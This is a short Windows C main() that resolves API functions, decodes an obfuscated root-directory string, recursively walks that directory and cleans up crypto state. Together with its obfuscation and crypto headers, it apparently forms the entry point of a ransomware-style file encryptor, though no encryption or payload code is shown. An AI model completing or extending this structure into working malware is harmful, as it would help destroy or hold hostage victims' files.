#include <windows.h>
#include <stdio.h>
#include "api.h"
#include "crypto.h"
#include "files.h"
#include "obfuscate.h"


int main(void) {

    if (!check_functions()) return 1;


    char root[512];
    decodeString(s_root_dir, s_root_dir_len, root);

    walk_directory(root);

    cleanup_crypto();



    return 0;
}